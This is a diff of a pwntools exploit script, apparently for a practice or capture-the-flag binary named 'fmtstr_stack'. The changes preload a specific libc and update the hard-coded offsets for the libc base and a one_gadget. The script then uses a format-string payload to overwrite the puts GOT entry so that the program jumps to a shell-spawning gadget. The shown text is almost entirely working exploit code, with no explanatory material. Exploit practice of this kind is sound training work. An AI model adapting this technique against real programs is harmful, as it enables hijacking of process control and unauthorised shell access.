@@ -3,6 +3,8 @@ from pwn import *
 
 p = process('./fmtstr_stack')
 elf = ELF('./fmtstr_stack')
+libc_file = "../libc.so.6.md5.5898fac5d2680d0d8fefdadd632b7188"
+p = process("./fmtstr_stack", env={'LD_PRELOAD': libc_file})
 
 context.log_level = 'debug'
 context.terminal = ['tmux', 'splitw', '-h']
@@ -28,11 +30,11 @@ print(hex(elf_base))
 
 libc_base = p.recvline().decode().strip()
 print(libc_base)
-libc_base = int(libc_base, 16) - (0x007ffff7df30b3-0x007ffff7dcc000)
+libc_base = int(libc_base, 16) - (0x00007ffff7df9083-0x00007ffff7dd5000)
 print(hex(libc_base))
 
 got_puts = elf_base + elf.got['puts']
-one_gadget = libc_base + 0xe6c81
+one_gadget = libc_base + 0xe3b01
 
 # overwrite puts@got with one_gadget
 payload = fmtstr_payload(8, {got_puts: one_gadget}, write_size='byte', numbwritten=0)
